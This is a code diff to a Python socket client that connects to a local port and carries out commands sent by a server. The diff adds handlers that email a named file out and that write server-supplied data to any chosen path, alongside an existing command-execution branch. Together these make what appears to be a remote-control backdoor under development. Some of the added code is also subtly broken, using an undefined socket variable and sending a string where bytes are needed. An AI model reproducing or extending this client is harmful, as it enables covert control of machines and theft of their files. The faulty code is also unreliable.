@@ -12,6 +12,19 @@ def file_size(path):
     return os.path.getsize(path)
 
 
+def download_file(file_path):
+    with open(file_path, 'wb')as f:
+        print('Open File')
+        while True:
+            data = client_socket.recv(1024)
+            if not data or len(data) < 1024:
+                f.write(data)
+                f.flush()
+                f.close()
+                break
+            f.write(data)
+
+
 def send_email(file_name):
     fromaddr = "From"
     toaddr = "To"
@@ -70,20 +83,12 @@ def send_email(file_name):
     s.quit()
 
 
-def file_size(path):
-    return os.path.getsize(path)
-
-def file_size(path):
-    return os.path.getsize(path)
-
-
 def client():
     s = socket.socket()
     s.connect(('127.0.0.1', 9984))
 
     while True:
         data = s.recv(1024).decode('utf-8')
-        print('Got Data ', repr(data))
         if 'cmd' in data:
             try:
                 data = data.replace('cmd ', '')
@@ -101,6 +106,24 @@ def client():
                 else:
                     f.close()
                     break
+
+        elif 'send email ' in data:
+            data = data.replace('send email ', '')
+            send_email(data)
+            s.sendall('The Email Was Sent')
+
+        elif 'download file ' in data:
+            data = data.replace('download file ', '')
+            with open(data, 'wb')as f:
+                while True:
+                    data = s.recv(1024)
+                    if not data or len(data) < 1024:
+                        f.write(data)
+                        f.flush()
+                        f.close()
+                        break
+                    f.write(data)
+
         else:
             s.send('The command was not found'.encode('utf-8'))
 
@@ -109,4 +132,3 @@ def client():
 
 if __name__ == '__main__':
     client()
-
